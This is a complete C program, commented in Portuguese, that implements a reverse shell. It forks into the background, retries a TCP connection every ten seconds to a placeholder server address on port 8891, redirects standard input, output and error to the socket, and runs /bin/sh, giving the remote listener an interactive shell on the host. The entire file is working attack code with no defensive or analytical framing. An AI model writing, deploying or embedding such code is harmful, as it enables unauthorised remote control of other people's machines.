#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define SERVER "XXX.XXX.XXX.XXXX"
#define PORT 8891

int main(void) {

  pid_t pid = fork();

  /* 
    Para garantir que o terminal não fique travado durante a execução do código
    Um novo processo é gerado para que o código seja executado a partir da nova instância gerada
  */

  if (pid == -1) {
    printf("[-] Fork failed\n");
    return (1);
  } else if (pid > 0) {
    return (0);
  }
  
  // Definição da estrutura necessária para a realizar a conexão com o servidor
  struct sockaddr_in server_addr;
  server_addr.sin_addr.s_addr = inet_addr(SERVER);
  server_addr.sin_port = htons(PORT);
  server_addr.sin_family = AF_INET;

  // Cria o socket
  int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

  // Tenta se conectar ao servidor a cada 10 segundos
  while(connect(socket_fd, (struct sockaddr*) &server_addr, sizeof(server_addr)) != 0) {
    sleep(10);
  }

  // Direciona os descritores padrão para o socket (conectado ao servidor)
  dup2(socket_fd, 0);
  dup2(socket_fd, 1);
  dup2(socket_fd, 2);

  // Envia o shell do sistema para o servidor. 
  char *const argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);

  return 0;
}
